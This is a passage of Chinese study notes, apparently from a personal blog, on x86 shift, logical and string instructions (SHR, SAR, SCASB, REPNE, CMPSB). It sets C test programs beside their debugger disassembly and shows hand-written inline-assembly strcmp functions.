逻辑右移指令</p>\n<p>相当于乘 2，用 0 来补位，有可能移除</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int _tmain(int argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tprintf(&quot;shabi&quot;);</span><br><span class=\"line\">\tunsigned int i = 0x77883322;</span><br><span class=\"line\">\ti = i &gt;&gt; 8;</span><br><span class=\"line\">\ti = i &gt;&gt; 2;</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">011D1000 &gt;/$  55            push    ebp</span><br><span class=\"line\">011D1001  |.  8BEC          mov     ebp,esp</span><br><span class=\"line\">011D1003  |.  51            push    ecx</span><br><span class=\"line\">011D1004  |.  68 F4201D01   push    011D20F4                                ; /format = &quot;shabi&quot;</span><br><span class=\"line\">011D1009  |.  FF15 A0201D01 call    dword ptr ds:[&lt;&amp;MSVCR90.printf&gt;]        ; \\printf</span><br><span class=\"line\">011D100F  |.  83C4 04       add     esp,0x4</span><br><span class=\"line\">011D1012  |.  C745 FC 22330&gt;mov     [local.1],0x3322</span><br><span class=\"line\">011D1019  |.  8B45 FC       mov     eax,[local.1]</span><br><span class=\"line\">011D101C  |.  C1E8 08       shr     eax,0x8\t\t\t\t\t\t\t\t\t; 0x 00 77 88 33  ÷(2^8)</span><br><span class=\"line\">011D101F  |.  8945 FC       mov     [local.1],eax</span><br><span class=\"line\">011D1022  |.  8B4D FC       mov     ecx,[local.1]</span><br><span class=\"line\">011D1025  |.  C1E9 02       shr     ecx,0x2\t\t\t\t\t\t\t\t\t; ÷ 4</span><br><span class=\"line\">011D1028  |.  894D FC       mov     [local.1],ecx</span><br><span class=\"line\">011D102B  |.  33C0          xor     eax,eax</span><br><span class=\"line\">011D102D  |.  8BE5          mov     esp,ebp</span><br><span class=\"line\">011D102F  |.  5D            pop     ebp</span><br><span class=\"line\">011D1030  \\.  C3            retn</span><br></pre></td></tr></table></figure>\n<p>2. 算术位移</p>\n<p>SAR 算术右移指令</p>\n<p>​\tSAR 右移时保留操作数符号，用符号位补</p>\n<p>​\tSHR 右移时用 0 部位</p>\n<p>SAL 算术左移指令</p>\n<p>​\tSAL 与 SHL 功能一样</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int _tmain(int argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tprintf(&quot;shabi&quot;);</span><br><span class=\"line\">\tint i = -100000000;</span><br><span class=\"line\">\ti = i &lt;&lt; 5;</span><br><span class=\"line\">\tprintf(&quot;%d&quot;,i);  //1094967296</span><br><span class=\"line\">\tgetchar();</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>3. 循环位移指令</p>\n<p>ROL 循环左移</p>\n<p>ROR 循环右移</p>\n</blockquote>\n<h4 id=\"逻辑运算符\"><a class=\"markdownIt-Anchor\" href=\"#逻辑运算符\">#</a> 逻辑运算符</h4>\n<blockquote>\n<p>逻辑或 ||</p>\n<p>截断原理，如果前面为真，那么不在判断后面的。因此在代码优化层面，把可能性大的放在前面提高效率</p>\n<p>按位或 |</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">01321000 &gt;/$  55            push    ebp</span><br><span class=\"line\">01321001  |.  8BEC          mov     ebp,esp</span><br><span class=\"line\">01321003  |.  83EC 10       sub     esp,0x10</span><br><span class=\"line\">01321006  |.  68 F4203201   push    013220F4                                    ; /format = &quot;shabi&quot;</span><br><span class=\"line\">0132100B  |.  FF15 A0203201 call    dword ptr ds:[&lt;&amp;MSVCR90.printf&gt;]            ; \\printf</span><br><span class=\"line\">01321011  |.  83C4 04       add     esp,0x4</span><br><span class=\"line\">01321014  |.  C745 FC 05000&gt;mov     [local.1],0x5</span><br><span class=\"line\">0132101B  |.  C745 F8 03000&gt;mov     [local.2],0x3</span><br><span class=\"line\">01321022  |.  837D FC 00    cmp     [local.1],0x0</span><br><span class=\"line\">01321026  |.  75 0F         jnz     short 01321037</span><br><span class=\"line\">01321028  |.  837D F8 00    cmp     [local.2],0x0</span><br><span class=\"line\">0132102C  |.  75 09         jnz     short 01321037</span><br><span class=\"line\">0132102E  |.  C745 F0 00000&gt;mov     [local.4],0x0</span><br><span class=\"line\">01321035  |.  EB 07         jmp     short 0132103E</span><br><span class=\"line\">01321037  |&gt;  C745 F0 01000&gt;mov     [local.4],0x1</span><br><span class=\"line\">0132103E  |&gt;  8B45 F0       mov     eax,[local.4]</span><br><span class=\"line\">01321041  |.  8945 F4       mov     [local.3],eax</span><br><span class=\"line\">01321044  |.  33C0          xor     eax,eax</span><br><span class=\"line\">01321046  |.  8BE5          mov     esp,ebp</span><br><span class=\"line\">01321048  |.  5D            pop     ebp</span><br><span class=\"line\">01321049  \\.  C3            retn</span><br></pre></td></tr></table></figure>\n<p>逻辑与  &amp;&amp;</p>\n<p>按位与 &amp;</p>\n<p>非运算 ！</p>\n<p>按位取反 ～</p>\n<p>sete al   // 取 ZF 位的值，保存到寄存器中</p>\n<p>setne  al  //zf 取反保存到寄存器中</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int _tmain(int argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tprintf(&quot;shabi&quot;);</span><br><span class=\"line\">\tint a =5,b=4,c,d;</span><br><span class=\"line\"></span><br><span class=\"line\">\tc = !a;</span><br><span class=\"line\">\td = ~b;</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00FC1000 &gt;/$  55            push    ebp</span><br><span class=\"line\">00FC1001  |.  8BEC          mov     ebp,esp</span><br><span class=\"line\">00FC1003  |.  83EC 10       sub     esp,0x10</span><br><span class=\"line\">00FC1006  |.  68 F420FC00   push    00FC20F4                                 ; /format = &quot;shabi&quot;</span><br><span class=\"line\">00FC100B  |.  FF15 A020FC00 call    dword ptr ds:[&lt;&amp;MSVCR90.printf&gt;]         ; \\printf</span><br><span class=\"line\">00FC1011  |.  83C4 04       add     esp,0x4</span><br><span class=\"line\">00FC1014  |.  C745 FC 05000&gt;mov     [local.1],0x5</span><br><span class=\"line\">00FC101B  |.  C745 F8 04000&gt;mov     [local.2],0x4</span><br><span class=\"line\">00FC1022  |.  33C0          xor     eax,eax</span><br><span class=\"line\">00FC1024  |.  837D FC 00    cmp     [local.1],0x0</span><br><span class=\"line\">00FC1028  |.  0F94C0        sete    al</span><br><span class=\"line\">00FC102B  |.  8945 F0       mov     [local.4],eax</span><br><span class=\"line\">00FC102E  |.  8B4D F8       mov     ecx,[local.2]</span><br><span class=\"line\">00FC1031  |.  F7D1          not     ecx</span><br><span class=\"line\">00FC1033  |.  894D F4       mov     [local.3],ecx</span><br><span class=\"line\">00FC1036  |.  33C0          xor     eax,eax</span><br><span class=\"line\">00FC1038  |.  8BE5          mov     esp,ebp</span><br><span class=\"line\">00FC103A  |.  5D            pop     ebp</span><br><span class=\"line\">00FC103B  \\.  C3            retn</span><br></pre></td></tr></table></figure>\n<p>异或运算</p>\n<p>按位异或 ^</p>\n<p>xor eax,eax   //eax 清零</p>\n<p>可以看成没有进位的加法</p>\n<p>交换 a,b</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a = a + b</span><br><span class=\"line\">b = a - b</span><br><span class=\"line\">a = a - b</span><br><span class=\"line\"></span><br><span class=\"line\">//</span><br><span class=\"line\">a = a ^ b</span><br><span class=\"line\">b = a ^ b</span><br><span class=\"line\">a = a ^ b</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</blockquote>\n<h4 id=\"字符操作相关指令\"><a class=\"markdownIt-Anchor\" href=\"#字符操作相关指令\">#</a> 字符操作相关指令</h4>\n<blockquote>\n<p>strcmp</p>\n<p>需要将优化中的启动内部函数设为否，关闭优化</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00F81000 &gt;/$  55            push    ebp</span><br><span class=\"line\">00F81001  |.  8BEC          mov     ebp,esp</span><br><span class=\"line\">00F81003  |.  83EC 08       sub     esp,0x8</span><br><span class=\"line\">00F81006  |.  68 F420F800   push    00F820F4                               ; /format = &quot;shabi&quot;</span><br><span class=\"line\">00F8100B  |.  FF15 A420F800 call    dword ptr ds:[&lt;&amp;MSVCR90.printf&gt;]       ; \\printf</span><br><span class=\"line\">00F81011  |.  83C4 04       add     esp,0x4</span><br><span class=\"line\">00F81014  |.  C745 F8 FC20F&gt;mov     [local.2],00F820FC                     ;  ASCII &quot;123456&quot;</span><br><span class=\"line\">00F8101B  |.  C745 FC 0421F&gt;mov     [local.1],00F82104                     ;  ASCII &quot;shabishabi&quot;</span><br><span class=\"line\">00F81022  |.  8B45 FC       mov     eax,[local.1]</span><br><span class=\"line\">00F81025  |.  50            push    eax                                    ; /s2</span><br><span class=\"line\">00F81026  |.  8B4D F8       mov     ecx,[local.2]                          ; |</span><br><span class=\"line\">00F81029  |.  51            push    ecx                                    ; |s1</span><br><span class=\"line\">00F8102A  |.  E8 19000000   call    strcmp                                 ; \\strcmp</span><br><span class=\"line\">00F8102F  |.  83C4 08       add     esp,0x8</span><br><span class=\"line\">00F81032  |.  33C0          xor     eax,eax</span><br><span class=\"line\">00F81034  |.  8BE5          mov     esp,ebp</span><br><span class=\"line\">00F81036  |.  5D            pop     ebp</span><br><span class=\"line\">00F81037  \\.  C3            retn</span><br></pre></td></tr></table></figure>\n<p>strcmp</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">74D6B8E0 &gt;  8B5424 04       mov     edx,dword ptr ss:[esp+0x4]</span><br><span class=\"line\">74D6B8E4    8B4C24 08       mov     ecx,dword ptr ss:[esp+0x8]</span><br><span class=\"line\">74D6B8E8    F7C2 03000000   test    edx,0x3</span><br><span class=\"line\">74D6B8EE    75 3C           jnz     short 74D6B92C</span><br><span class=\"line\">74D6B8F0    8B02            mov     eax,dword ptr ds:[edx]</span><br><span class=\"line\">74D6B8F2    3A01            cmp     al,byte ptr ds:[ecx]</span><br><span class=\"line\">74D6B8F4    75 2E           jnz     short 74D6B924</span><br><span class=\"line\">74D6B8F6    0AC0            or      al,al</span><br><span class=\"line\">74D6B8F8    74 26           je      short 74D6B920</span><br><span class=\"line\">74D6B8FA    3A61 01         cmp     ah,byte ptr ds:[ecx+0x1]</span><br><span class=\"line\">74D6B8FD    75 25           jnz     short 74D6B924</span><br><span class=\"line\">74D6B8FF    0AE4            or      ah,ah</span><br><span class=\"line\">74D6B901    74 1D           je      short 74D6B920</span><br><span class=\"line\">74D6B903    C1E8 10         shr     eax,0x10</span><br><span class=\"line\">74D6B906    3A41 02         cmp     al,byte ptr ds:[ecx+0x2]</span><br><span class=\"line\">74D6B909    75 19           jnz     short 74D6B924</span><br><span class=\"line\">74D6B90B    0AC0            or      al,al</span><br><span class=\"line\">74D6B90D    74 11           je      short 74D6B920</span><br><span class=\"line\">74D6B90F    3A61 03         cmp     ah,byte ptr ds:[ecx+0x3]</span><br><span class=\"line\">74D6B912    75 10           jnz     short 74D6B924</span><br><span class=\"line\">74D6B914    83C1 04         add     ecx,0x4</span><br><span class=\"line\">74D6B917    83C2 04         add     edx,0x4</span><br><span class=\"line\">74D6B91A    0AE4            or      ah,ah</span><br><span class=\"line\">74D6B91C  ^ 75 D2           jnz     short 74D6B8F0</span><br><span class=\"line\">74D6B91E    8BFF            mov     edi,edi</span><br><span class=\"line\">74D6B920    33C0            xor     eax,eax</span><br><span class=\"line\">74D6B922    C3              retn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>每次取四个字节依次比较</p>\n<p>SCASB</p>\n<p>SCAS byte ptr es:[EDI]   用于查找 AL 的字符在 edi 中的位置</p>\n<p>相当于</p>\n<p>cmp byte ptr [edi],al</p>\n<p>对标志位的影响相当于 sub 指令，还会修改 edi 的值</p>\n<p>DF=0 ，inc edi</p>\n<p>DF=1,  dec edi</p>\n<p>REPNE</p>\n<p>repne scasb</p>\n<p>ecx !=0 ,zf=0，重复执行后面指令，每执行一次 ecx-1</p>\n<p>REPNE 与 REPNZ 是同一条指令不同助记符</p>\n<p>// 通过 repne 计算字符串长度</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int _tmain(int argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tprintf(&quot;shabi&quot;);</span><br><span class=\"line\">\tchar *s1 = &quot;123456&quot;;</span><br><span class=\"line\">\t__asm &#123;  //cal length</span><br><span class=\"line\">\t\t\tmov al,0</span><br><span class=\"line\">\t\t\tmov edi,s1</span><br><span class=\"line\">\t\t\tmov ecx,-1</span><br><span class=\"line\">\t\t\trepnz scasb</span><br><span class=\"line\">\t\t\tmov eax,-1</span><br><span class=\"line\">\t\t\tsub eax,ecx </span><br><span class=\"line\"></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t__asm &#123;   //find index</span><br><span class=\"line\">\t\t\txor eax,rax</span><br><span class=\"line\">\t\t\tmov al,0x33</span><br><span class=\"line\">\t\t\tmov edi,s1</span><br><span class=\"line\">\t\t\tmov ecx,-1</span><br><span class=\"line\">\t\t\trepnz scasb</span><br><span class=\"line\">\t\t\tnot ecx</span><br><span class=\"line\">\t\t\tdec ecx</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tstd::string str1 = s1;</span><br><span class=\"line\">\tint haha = str1.find(&quot;3&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00901000 &gt;/$  55            push    ebp</span><br><span class=\"line\">00901001  |.  8BEC          mov     ebp,esp</span><br><span class=\"line\">00901003  |.  51            push    ecx</span><br><span class=\"line\">00901004  |.  57            push    edi</span><br><span class=\"line\">00901005  |.  68 F4209000   push    009020F4                               ; /format = &quot;shabi&quot;</span><br><span class=\"line\">0090100A  |.  FF15 A0209000 call    dword ptr ds:[&lt;&amp;MSVCR90.printf&gt;]       ; \\printf</span><br><span class=\"line\">00901010  |.  83C4 04       add     esp,0x4</span><br><span class=\"line\">00901013  |.  C745 FC FC209&gt;mov     [local.1],009020FC                     ;  ASCII &quot;123456&quot;</span><br><span class=\"line\">0090101A  |.  B0 00         mov     al,0x0</span><br><span class=\"line\">0090101C  |.  8B7D FC       mov     edi,[local.1]</span><br><span class=\"line\">0090101F  |.  B9 FFFFFFFF   mov     ecx,-0x1</span><br><span class=\"line\">00901024  |.  F2:AE         repne   scas byte ptr es:[edi]</span><br><span class=\"line\">00901026  |.  B8 FFFFFFFF   mov     eax,-0x1</span><br><span class=\"line\">0090102B  |.  2BC1          sub     eax,ecx</span><br><span class=\"line\">0090102D  |.  33C0          xor     eax,eax</span><br><span class=\"line\">0090102F  |.  5F            pop     edi</span><br><span class=\"line\">00901030  |.  8BE5          mov     esp,ebp</span><br><span class=\"line\">00901032  |.  5D            pop     ebp</span><br><span class=\"line\">00901033  \\.  C3            retn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>SCASB  SCASW  SCASD</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221124212255214.png\" alt=\"image-20221124212255214\"></p>\n<p>mov ax,L’7’</p>\n<p>实例运用</p>\n<p>1. 计算字符串长度</p>\n<p>2. 定位特定字符串位置（索引)</p>\n<p>3. 在内存中定位一串特征码</p>\n<p>REPNZ/REPNE 与 SCASB 指令结合使用，表示当串未结束 (ECX!=0)，且当对应串元素不相同 (ZF=0) 时，继续重复执行串比较指令</p>\n<p>REPE/REPZ 和 CMPSB，CMPSW，CMPSD</p>\n<p>1.CMPS</p>\n<p>cmps byte ptr [edi], byte ptr [esi]</p>\n<p>对标志位的影响相当于 sub 指令，同时还会修改 edi 和 esi 的值</p>\n<p>如果 df 为 0，则 edi，esi 按相对大小递增</p>\n<p>df 为 1，递减</p>\n<p>2.REPE、REPZ</p>\n<p>repe/repz cmpsb 当 ecx!=0，zf=1，重复执行后面指令，每执行一次 ecx-1</p>\n<p>用于比较字符串是否相等</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__asm &#123;</span><br><span class=\"line\">\t\txor al,al</span><br><span class=\"line\">\t\tmov edi,s1</span><br><span class=\"line\">\t\tmov ecx,-1</span><br><span class=\"line\">\t\trepnz scasb  //finish position</span><br><span class=\"line\">\t\tnot ecx    //cal length </span><br><span class=\"line\"></span><br><span class=\"line\">\t\tmov edi,s1</span><br><span class=\"line\">\t\tmov esi,s2</span><br><span class=\"line\">\t\trepz cmpsb  //compare equal</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\txor al,al</span><br><span class=\"line\">\t\tsete al</span><br><span class=\"line\">\t\tcmp al,1</span><br><span class=\"line\">\t\tjnz result1</span><br><span class=\"line\">\t\tcmp ecx,0</span><br><span class=\"line\">\t\tjz result2</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">result1:</span><br><span class=\"line\">\tprintf(&quot;S1!=S2&quot;);</span><br><span class=\"line\">\tgoto end</span><br><span class=\"line\">result2:</span><br><span class=\"line\">\tprintf(&quot;s1==s2&quot;);</span><br><span class=\"line\">end:</span><br><span class=\"line\">\tgetchar();</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>汇编编写比较函数</p>\n<p>__declspec (naked)   纯汇编编译函数，不添加寄存器保护和堆栈平衡代码</p>\n<p>窄字节版</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__declspec(naked) int strcmpa(char *s1, char *s2)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t__asm&#123;</span><br><span class=\"line\">\t\t\tpush ebp  //esp-4-4</span><br><span class=\"line\">\t\t\tmov ebp,esp   //s1:ebp+4+4   s2:ebp+4+8</span><br><span class=\"line\">\t\t\tpush ecx</span><br><span class=\"line\">\t\t\tpush edi</span><br><span class=\"line\">\t\t\tpush esi</span><br><span class=\"line\">\t\t\tpush edx</span><br><span class=\"line\">\t\t\t</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\txor al,al</span><br><span class=\"line\">\t\t\tmov edi,s1</span><br><span class=\"line\">\t\t\tCLD</span><br><span class=\"line\">\t\t\tmov ecx,-1</span><br><span class=\"line\">\t\t\trepnz scasb  //finish position</span><br><span class=\"line\">\t\t\tnot ecx    //cal length </span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\tmov edi,s1</span><br><span class=\"line\">\t\t\tmov esi,s2</span><br><span class=\"line\">\t\t\trepz cmpsb  //compare equal</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\txor eax,eax</span><br><span class=\"line\">\t\t\txor edx,edx</span><br><span class=\"line\">\t\t\tmov al,[edi-1]</span><br><span class=\"line\">\t\t\tmov dl,[esi-1]</span><br><span class=\"line\">\t\t\tsub eax,edx</span><br><span class=\"line\">\t\t\tpop edx</span><br><span class=\"line\">\t\t\tpop esi</span><br><span class=\"line\">\t\t\tpop edi</span><br><span class=\"line\">\t\t\tpop ecx </span><br><span class=\"line\">\t\t\tpop ebp</span><br><span class=\"line\">\t\t\tretn</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>宽字节版</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__declspec(naked) int strcmpW(wchar_t *s1, wchar_t *s2)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t__asm&#123;</span><br><span class=\"line\">\t\t\tpush ebp  //esp-4-4</span><br><span class=\"line\">\t\t\tmov ebp,esp   //s1:ebp+4+4   s2:ebp+4+8</span><br><span class=\"line\">\t\t\tpush ecx</span><br><span class=\"line\">\t\t\tpush edi</span><br><span class=\"line\">\t\t\tpush esi</span><br><span class=\"line\">\t\t\tpush edx</span><br><span class=\"line\">\t\t\t</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\txor ax,ax</span><br><span class=\"line\">\t\t\tmov edi,s1</span><br><span class=\"line\">\t\t\tmov ecx,-1</span><br><span class=\"line\">\t\t\tCLD</span><br><span class=\"line\">\t\t\trepnz scasw  //finish position</span><br><span class=\"line\">\t\t\tnot ecx      //cal length </span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\tmov edi,s1</span><br><span class=\"line\">\t\t\tmov esi,s2</span><br><span class=\"line\">\t\t\trepz cmpsw   //compare equal</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\txor eax,eax</span><br><span class=\"line\">\t\t\txor edx,edx</span><br><span 